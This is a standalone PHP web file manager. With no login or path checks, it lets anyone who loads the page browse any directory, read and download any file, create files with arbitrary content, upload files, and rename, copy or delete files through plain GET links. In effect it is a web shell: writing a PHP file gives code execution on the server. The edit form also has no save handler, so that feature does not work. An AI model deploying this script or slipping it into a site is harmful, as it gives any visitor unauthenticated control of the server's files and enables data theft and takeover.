<?php

function listDirectoryContents($dir) {
    $files = scandir($dir);

    echo "<h2>Current Directory: ";
    $pathParts = explode(DIRECTORY_SEPARATOR, $dir);
    $pathLink = "";

    foreach ($pathParts as $index => $part) {
        $pathLink .= ($index > 0 ? DIRECTORY_SEPARATOR : "") . $part;
        echo "<a href='?dir=" . urlencode($pathLink) . "'>" . htmlspecialchars($part) . "</a>";
        if ($index < count($pathParts) - 1) echo " / ";
    }
    echo "</h2>";

    echo "<ul>";

    if ($dir !== __DIR__) {
        $parentDir = dirname($dir);
        echo "<li><a href='?dir=" . urlencode($parentDir) . "'>⬅ Back</a></li>";
    }

    foreach ($files as $file) {
        if ($file === "." || $file === "..") continue;

        $path = $dir . DIRECTORY_SEPARATOR . $file;

        if (is_dir($path)) {
            echo "<li>[DIR] <a href='?dir=" . urlencode($path) . "'>" . htmlspecialchars($file) . "</a>";
            echo " <a href='?delete=" . urlencode($path) . "' onclick='return confirm(\"Are you sure you want to delete this folder?\")'>[Delete]</a>";
            echo " <a href='?rename=" . urlencode($path) . "'>[Rename]</a></li>";
        } else {
            echo "<li>[FILE] <a href='?file=" . urlencode($path) . "'>" . htmlspecialchars($file) . "</a>";
            echo " <a href='?delete=" . urlencode($path) . "' onclick='return confirm(\"Are you sure you want to delete this file?\")'>[Delete]</a>";
            echo " <a href='?rename=" . urlencode($path) . "'>[Rename]</a>";
            echo " <a href='?download=" . urlencode($path) . "' target='_blank'>[Download]</a>";
            echo " <a href='?copy=" . urlencode($path) . "'>[Copy]</a></li>";
        }
    }
    echo "</ul>";

    // Create New File Form
    echo "<h3>Create New File</h3>";
    echo "<form method='POST' action=''>";
    echo "<input type='hidden' name='current_dir' value='" . htmlspecialchars($dir) . "'>";
    echo "<input type='text' name='new_file_name' placeholder='Enter file name with extension' required><br>";
    echo "<textarea name='file_content' placeholder='Enter content for new file'></textarea><br>";
    echo "<button type='submit'>Create File</button>";
    echo "</form>";

    // File Upload Form
    echo "<h3>Upload File</h3>";
    echo "<form method='POST' enctype='multipart/form-data' action=''>";
    echo "<input type='hidden' name='current_dir' value='" . htmlspecialchars($dir) . "'>";
    echo "<input type='file' name='uploaded_file' required><br>";
    echo "<button type='submit'>Upload File</button>";
    echo "</form>";
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['new_file_name'], $_POST['current_dir'])) {
        $newFileName = $_POST['new_file_name'];
        $currentDir = $_POST['current_dir'];
        $fileContent = $_POST['file_content'] ?? "";
        $filePath = $currentDir . DIRECTORY_SEPARATOR . $newFileName;

        if (!file_exists($filePath)) {
            file_put_contents($filePath, $fileContent);
            echo "<p>File '$newFileName' created successfully in '$currentDir'.</p>";
        } else {
            echo "<p>File already exists.</p>";
        }
        listDirectoryContents($currentDir);
    } elseif (isset($_FILES['uploaded_file'], $_POST['current_dir'])) {
        $currentDir = $_POST['current_dir'];
        $uploadedFile = $_FILES['uploaded_file'];

        if ($uploadedFile['error'] === UPLOAD_ERR_OK) {
            $targetPath = $currentDir . DIRECTORY_SEPARATOR . basename($uploadedFile['name']);
            if (move_uploaded_file($uploadedFile['tmp_name'], $targetPath)) {
                echo "<p>File '" . htmlspecialchars($uploadedFile['name']) . "' uploaded successfully to '$currentDir'.</p>";
            } else {
                echo "<p>Failed to upload file.</p>";
            }
        } else {
            echo "<p>Error uploading file: " . $uploadedFile['error'] . "</p>";
        }
        listDirectoryContents($currentDir);
    } elseif (isset($_POST['rename_path'], $_POST['new_name'])) {
        $oldPath = $_POST['rename_path'];
        $newName = $_POST['new_name'];
        $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . $newName;

        if (rename($oldPath, $newPath)) {
            echo "<p>'" . htmlspecialchars(basename($oldPath)) . "' renamed to '" . htmlspecialchars($newName) . "'.</p>";
        } else {
            echo "<p>Failed to rename '" . htmlspecialchars(basename($oldPath)) . "'.</p>";
        }
        listDirectoryContents(dirname($oldPath));
    }
} elseif (isset($_GET['delete'])) {
    $deletePath = $_GET['delete'];

    if (is_dir($deletePath)) {
        if (rmdir($deletePath)) {
            echo "<p>Folder '" . htmlspecialchars(basename($deletePath)) . "' deleted successfully.</p>";
        } else {
            echo "<p>Failed to delete folder '" . htmlspecialchars(basename($deletePath)) . "'. Make sure it is empty.</p>";
        }
    } elseif (is_file($deletePath)) {
        if (unlink($deletePath)) {
            echo "<p>File '" . htmlspecialchars(basename($deletePath)) . "' deleted successfully.</p>";
        } else {
            echo "<p>Failed to delete file '" . htmlspecialchars(basename($deletePath)) . "'.</p>";
        }
    }
    listDirectoryContents(dirname($deletePath));
} elseif (isset($_GET['rename'])) {
    $renamePath = $_GET['rename'];
    echo "<h2>Rename '" . htmlspecialchars(basename($renamePath)) . "'</h2>";
    echo "<form method='POST' action=''>";
    echo "<input type='hidden' name='rename_path' value='" . htmlspecialchars($renamePath) . "'>";
    echo "<input type='text' name='new_name' placeholder='Enter new name' required>";
    echo "<button type='submit'>Rename</button>";
    echo "</form>";
    echo "<a href='?dir=" . urlencode(dirname($renamePath)) . "'>⬅ Back to Directory</a>";
} elseif (isset($_GET['file'])) {
    $file = $_GET['file'];
    if (file_exists($file)) {
        echo "<h2>File Contents: " . htmlspecialchars($file) . "</h2>";
        $content = htmlspecialchars(file_get_contents($file));
        echo "<form method='POST' action=''>";
        echo "<input type='hidden' name='edit_file' value='" . htmlspecialchars($file) . "'>";
        echo "<textarea name='file_content' rows='10' cols='50'>$content</textarea><br>";
        echo "<button type='submit'>Save Changes</button>";
        echo "</form>";
        echo "<a href='?dir=" . urlencode(dirname($file)) . "'>⬅ Back to Directory</a>";
    } else {
        echo "File does not exist.";
    }
} elseif (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file) && is_file($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    } else {
        echo "<p>File not found for download.</p>";
    }
} elseif (isset($_GET['copy'])) {
    $file = $_GET['copy'];
    if (file_exists($file) && is_file($file)) {
        $copyName = dirname($file) . DIRECTORY_SEPARATOR . 'copy_of_' . basename($file);
        if (copy($file, $copyName)) {
            echo "<p>File copied successfully as '" . htmlspecialchars(basename($copyName)) . "'</p>";
        } else {
            echo "<p>Failed to copy file.</p>";
        }
    } else {
        echo "<p>File not found to copy.</p>";
    }
    listDirectoryContents(dirname($file));
} else {
    $dir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;
    listDirectoryContents($dir);
}

?>
